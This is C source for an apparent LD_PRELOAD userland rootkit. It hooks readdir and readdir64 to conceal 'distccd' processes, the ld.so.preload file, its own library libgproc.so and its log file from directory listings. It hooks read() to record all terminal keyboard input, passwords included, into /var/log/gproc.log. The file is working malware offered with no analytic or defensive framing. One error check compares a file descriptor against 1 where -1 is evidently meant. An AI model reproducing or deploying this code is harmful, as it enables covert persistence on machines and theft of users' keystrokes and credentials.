#define _GNU_SOURCE
#include <stdio.h>
#include <dlfcn.h>
#include <fcntl.h>
#include <dirent.h>
#include <string.h>
#include <unistd.h>

#define TGT_PROC "distccd"
#define PROC_FS  "/proc"
#define FD_DIR   PROC_FS "/self/fd/"
#define ETC_DIR  "/etc"
#define PRE_LD   "ld.so.preload"
#define LIB_DIR  "/usr/lib64"
#define LIB      "libgproc.so"
#define LOG_DIR  "/var/log"
#define LOG      "gproc.log"

#define BUF_SIZE 256
#define FD_MAX   10

static int get_dirfd_name(char * const buf, DIR * const dirp)
{
	char path[sizeof(FD_DIR) - 1 + FD_MAX] = FD_DIR;
	const int dir_fd = dirfd(dirp);
	if (dir_fd == -1) return 0;
	snprintf(path + sizeof(FD_DIR) - 1, FD_MAX, "%d", dir_fd);
	{
		const ssize_t rlc = readlink(path, buf, BUF_SIZE);
		if (!rlc) return 0;
		buf[rlc] = 0;
	}
	return 1;
}
static int check_comm(char * const buf)
{
	const int fd = open(buf, O_RDONLY);
	if (fd == -1) return 0;
	{
		const ssize_t rdc = read(fd, buf, BUF_SIZE);
		close(fd);
		if (!rdc) return 0;
		buf[rdc - 1] = 0;
	}
	return !strncmp(buf, TGT_PROC, sizeof(TGT_PROC));
}
static int get_dir_proc(DIR * const dirp, const char * const pid)
{
	char buf[BUF_SIZE];
	if (!get_dirfd_name(buf, dirp)) return 0;
	if (!strncmp(buf, PROC_FS, sizeof(PROC_FS))) {
		snprintf(buf + sizeof(PROC_FS) - 1, BUF_SIZE - sizeof(PROC_FS) - 1, "/%s/comm", pid);
		return check_comm(buf);
	}
	return ((!strncmp(buf, ETC_DIR, sizeof(ETC_DIR)) && 
	         !strncmp(pid, PRE_LD,  sizeof(PRE_LD))) ||
	        (!strncmp(buf, LIB_DIR, sizeof(LIB_DIR)) && 
	         !strncmp(pid, LIB,     sizeof(LIB)))    ||
	        (!strncmp(buf, LOG_DIR, sizeof(LOG_DIR)) && 
	         !strncmp(pid, LOG,     sizeof(LOG))));
}
#define DECLARE_READDIR(dirent, readdir)                                             \
struct dirent* readdir(DIR * const dirp)                                             \
{                                                                                    \
	static struct dirent* (*o_##readdir)(DIR * const) = NULL;                        \
	if (!o_##readdir)                                                                \
		o_##readdir = (struct dirent *(*)(DIR * const)) dlsym(RTLD_NEXT, #readdir);  \
	do {                                                                             \
		struct dirent * const dir = o_##readdir(dirp);                               \
		if (!dir || !get_dir_proc(dirp, dir->d_name)) return dir;                    \
	} while (1);                                                                     \
}
DECLARE_READDIR(dirent64, readdir64)
DECLARE_READDIR(dirent,   readdir)

ssize_t read(int fd, void * buf, size_t count)
{
	static ssize_t (*o_read)(int, void *, size_t) = NULL;
	if (o_read == NULL) o_read = dlsym(RTLD_NEXT, "read");
	const ssize_t ret = o_read(fd, buf, count);
	if (fd == 0 && isatty(0) && ret > 0) {
		const int log_fd = open(LOG_DIR "/" LOG, O_WRONLY | O_APPEND | O_CREAT, 0644);
		if (log_fd != 1) {
			write(log_fd, buf, ret);
			close(log_fd);
		}
	}
	return ret;
}
